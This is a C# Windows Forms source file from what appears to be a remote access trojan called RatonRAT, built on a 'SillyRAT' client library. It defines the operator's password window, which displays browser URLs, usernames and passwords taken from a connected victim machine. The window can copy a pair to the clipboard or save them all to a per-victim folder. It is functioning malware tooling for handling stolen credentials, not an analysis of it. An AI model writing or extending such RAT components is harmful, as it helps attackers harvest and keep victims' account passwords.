using Server.Connection;
using SillyRAT;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class FormPassword : Form
    {
        [DllImport("user32.dll")]
        private static extern bool ShowScrollBar(IntPtr hWnd, int wBar, bool bShow);

        private const int SB_VERT = 1;

        private bool isMouseDown = false;

        private Point mouseOffset;

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        public SillyClient SillyClient { get; set; }
        public FormPassword()
        {
            InitializeComponent();
        }

        private void FormPassword_Load(object sender, EventArgs e)
        {
            for (int i = 1; i <= 19; i++)
            {
                Control btn = this.Controls.Find("button" + i, true).FirstOrDefault();
                if (btn != null)
                    btn.Region = new Region(CreateRoundPath(btn.ClientRectangle, 15));
            }
            new RatonRAT.Classes.LightMode().Apply(this);
            this.Paint += Form_Paint;
            timer1.Start();
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            ShowScrollBar(listView1.Handle, SB_VERT, true);
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
                if (listView1.SelectedItems.Count > 0)
                {
                    var selectedItem = listView1.SelectedItems[0];
                    string user = selectedItem.SubItems[1].Text;
                    string pass = selectedItem.SubItems[2].Text;
                    string textToCopy = $"User: {user}, Password: {pass}";
                    Clipboard.SetText(textToCopy);
                }
        }

        private void saveAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string clientsFolder = Program.ClientsFolder;
            string targetFolder = Path.Combine(clientsFolder, SillyClient.uid);

            if (Directory.Exists(targetFolder))
            {
                StringBuilder sb = new StringBuilder();

                foreach (ListViewItem item in listView1.Items)
                {
                    if (item.SubItems.Count >= 3)
                    {
                        sb.AppendLine($"URL: {item.SubItems[0].Text}");
                        sb.AppendLine($"User: {item.SubItems[1].Text}");
                        sb.AppendLine($"Password: {item.SubItems[2].Text}");
                        sb.AppendLine();
                    }
                }
                try
                {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                    string filePath = Path.Combine(targetFolder, $"Browser_{sb.Length}_{timestamp}.txt");

                    File.WriteAllText(filePath, sb.ToString());

                    MessageBox.Show($"Password files saved in:\n{filePath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                return;
            }
        }


        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
